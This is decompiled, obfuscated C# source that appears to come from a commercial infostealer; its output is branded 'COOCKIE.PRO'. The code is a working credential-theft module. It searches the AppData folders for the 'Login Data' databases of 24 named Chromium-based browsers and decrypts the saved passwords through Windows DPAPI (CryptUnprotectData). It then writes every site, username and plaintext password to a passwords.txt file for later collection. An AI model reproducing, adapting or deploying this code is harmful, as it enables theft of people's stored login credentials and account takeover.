using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using ns13;
using ns14;
using ns36;

namespace ns35
{
	// Token: 0x02000036 RID: 54
	internal class Class21
	{
		// Token: 0x060001E0 RID: 480 RVA: 0x0000ECD8 File Offset: 0x0000CED8
		public static void smethod_0()
		{
			string[] array = new string[]
			{
				"Chrome",
				"Yandex",
				"Orbitum",
				"Opera",
				"Amigo",
				"Torch",
				"Comodo",
				"CentBrowser",
				"Go!",
				"uCozMedia",
				"Rockmelt",
				"Sleipnir",
				"SRWare Iron",
				"Vivaldi",
				"Sputnik",
				"Maxthon",
				"AcWebBrowser",
				"Epic Browser",
				"MapleStudio",
				"BlackHawk",
				"Flock",
				"CoolNovo",
				"Baidu Spark",
				"Titan Browser"
			};
			try
			{
				Directory.CreateDirectory(GClass9.string_6 + "\\Browsers");
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				list2.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
				list2.Add(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
				List<string> list3 = new List<string>();
				foreach (string path in list2)
				{
					try
					{
						list3.AddRange(Directory.GetDirectories(path));
					}
					catch
					{
					}
				}
				foreach (string path2 in list3)
				{
					try
					{
						list.AddRange(Directory.GetFiles(path2, "Login Data", SearchOption.AllDirectories));
						foreach (string text in Directory.GetFiles(path2, "Login Data", SearchOption.AllDirectories))
						{
							try
							{
								if (File.Exists(text))
								{
									string string_ = "Unknown (" + text + ")";
									foreach (string text2 in array)
									{
										if (text.Contains(text2))
										{
											string_ = text2;
										}
									}
									try
									{
										string text3 = Path.GetTempPath() + "/test.fv";
										if (File.Exists(text3))
										{
											File.Delete(text3);
										}
										File.Copy(text, text3, true);
										Class7 @class = new Class7(text3);
										if (!@class.method_4("logins"))
										{
											break;
										}
										int num = 0;
										for (;;)
										{
											try
											{
												if (num >= @class.method_1())
												{
													break;
												}
												try
												{
													string text4 = string.Empty;
													try
													{
														text4 = Encoding.UTF8.GetString(Class21.smethod_1(Encoding.Default.GetBytes(@class.method_0(num, 5)), null));
													}
													catch (Exception)
													{
													}
													if (text4 != "")
													{
														Class22 class2 = new Class22
														{
															String_0 = @class.method_0(num, 1).Replace("https://", "").Replace("http://", "").Replace("www.", ""),
															String_1 = @class.method_0(num, 3),
															String_2 = text4,
															String_3 = string_
														};
														string str = Class21.string_0;
														string newLine = Environment.NewLine;
														Class22 class3 = class2;
														Class21.string_0 = str + Convert.ToString(newLine + ((class3 != null) ? class3.ToString() : null));
														Class21.int_0++;
													}
												}
												catch
												{
												}
												num++;
											}
											catch
											{
											}
										}
										File.Delete(text3);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
				File.WriteAllText(GClass9.string_6 + "\\passwords.txt", (Class21.string_0 != null) ? ("COOCKIE.PRO - Professionals in working with logs! " + Environment.NewLine + Class21.string_0 + "\n") : "", Encoding.Default);
			}
			catch
			{
			}
		}

		// Token: 0x060001E1 RID: 481 RVA: 0x0000F22C File Offset: 0x0000D42C
		public static byte[] smethod_1(byte[] byte_0, byte[] byte_1 = null)
		{
			Class21.Struct8 @struct = default(Class21.Struct8);
			Class21.Struct8 struct2 = default(Class21.Struct8);
			Class21.Struct8 struct3 = default(Class21.Struct8);
			Class21.Struct9 struct4 = new Class21.Struct9
			{
				int_0 = Marshal.SizeOf(typeof(Class21.Struct9)),
				int_1 = 0,
				intptr_0 = IntPtr.Zero,
				string_0 = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (byte_0 == null)
					{
						byte_0 = new byte[0];
					}
					struct2.intptr_0 = Marshal.AllocHGlobal(byte_0.Length);
					struct2.int_0 = byte_0.Length;
					Marshal.Copy(byte_0, 0, struct2.intptr_0, byte_0.Length);
				}
				catch
				{
				}
				try
				{
					if (byte_1 == null)
					{
						byte_1 = new byte[0];
					}
					struct3.intptr_0 = Marshal.AllocHGlobal(byte_1.Length);
					struct3.int_0 = byte_1.Length;
					Marshal.Copy(byte_1, 0, struct3.intptr_0, byte_1.Length);
				}
				catch
				{
				}
				Class21.CryptUnprotectData(ref struct2, ref empty, ref struct3, IntPtr.Zero, ref struct4, 1, ref @struct);
				byte[] array = new byte[@struct.int_0];
				Marshal.Copy(@struct.intptr_0, array, 0, @struct.int_0);
				return array;
			}
			catch
			{
			}
			finally
			{
				if (@struct.intptr_0 != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(@struct.intptr_0);
				}
				if (struct2.intptr_0 != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(struct2.intptr_0);
				}
				if (struct3.intptr_0 != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(struct3.intptr_0);
				}
			}
			return new byte[0];
		}

		// Token: 0x060001E2 RID: 482
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Class21.Struct8 struct8_0, ref string string_1, ref Class21.Struct8 struct8_1, IntPtr intptr_0, ref Class21.Struct9 struct9_0, int int_1, ref Class21.Struct8 struct8_2);

		// Token: 0x040000CB RID: 203
		public static string string_0;

		// Token: 0x040000CC RID: 204
		public static int int_0 = 0;

		// Token: 0x040000CD RID: 205
		public static List<Class22> list_0 = new List<Class22>();

		// Token: 0x02000037 RID: 55
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct Struct8
		{
			// Token: 0x040000CE RID: 206
			public int int_0;

			// Token: 0x040000CF RID: 207
			public IntPtr intptr_0;
		}

		// Token: 0x02000038 RID: 56
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct Struct9
		{
			// Token: 0x040000D0 RID: 208
			public int int_0;

			// Token: 0x040000D1 RID: 209
			public int int_1;

			// Token: 0x040000D2 RID: 210
			public IntPtr intptr_0;

			// Token: 0x040000D3 RID: 211
			public string string_0;
		}
	}
}
